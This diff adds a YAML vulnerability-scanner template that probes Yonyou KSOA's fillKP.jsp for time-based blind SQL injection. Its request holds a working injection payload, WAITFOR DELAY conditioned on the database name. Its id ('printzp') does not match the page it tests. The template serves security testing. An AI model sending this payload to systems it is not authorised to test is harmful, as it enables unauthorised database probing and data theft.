@@ -1,0 +1,32 @@
+id: poc-yaml-yongyou-ksoa-printzp-jsp-sqli
+info:
+  name: 用友时空KSOA fillKP.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    用友时空KSOA fillKP.jsp存在SQL注入漏洞，可通过构造恶意请求导致数据库信息泄露。
+
+variables:
+  t1: "{{rand_int(1, 5)}}"
+  t2: "{{to_number(t1) * 2 + 1}}"
+  t3: "{{url_encode('填写问卷')}}"
+  t4: "{{url_encode('考核等级')}}"
+
+http:
+  - method: GET
+    path:
+      - "/kp/fillKP.jsp?kp_djbh=1%27+IF(LEN(db_name())>4)+WAITFOR+DELAY+%270:0:{{t1}}%27+--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
+          - "{{t4}}"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
